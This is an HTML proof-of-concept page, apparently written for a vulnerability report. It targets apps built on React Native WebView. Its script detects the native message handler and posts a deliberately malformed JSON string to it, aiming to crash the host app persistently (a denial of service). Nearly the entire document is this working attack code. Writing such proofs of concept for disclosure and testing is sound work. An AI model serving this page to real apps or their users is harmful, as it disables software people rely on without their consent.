<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>ReactNativeWebView Persistent Crash PoC</title>
  <style>
    body { font-family: sans-serif; background: #111; color: #fff; padding: 20px; }
    pre { background: #222; padding: 10px; border-radius: 6px; }
  </style>
</head>
<body>
  <h1>Persistent DoS via Malformed JSON to ReactNativeWebView</h1>
  <div id="log">Status: Loadingâ€¦</div>

  <script>
    function log(msg) {
      const el = document.getElementById('log');
      el.textContent += '\n' + msg;
      console.log(msg);
    }

    try {
      if (window.webkit?.messageHandlers?.ReactNativeWebView) {
        log("ReactNativeWebView handler detected.");

        // Malformed JSON payload
        const payload = "{unclosed_json:"; // sengaja tidak valid JSON

        // Kirim ke native app
        window.webkit.messageHandlers.ReactNativeWebView.postMessage(payload);
        log("Payload sent: " + payload);
      } else {
        log("ReactNativeWebView handler not available.");
      }
    } catch (e) {
      log("JS Exception: " + e.message);
    }
  </script>
</body>
</html>
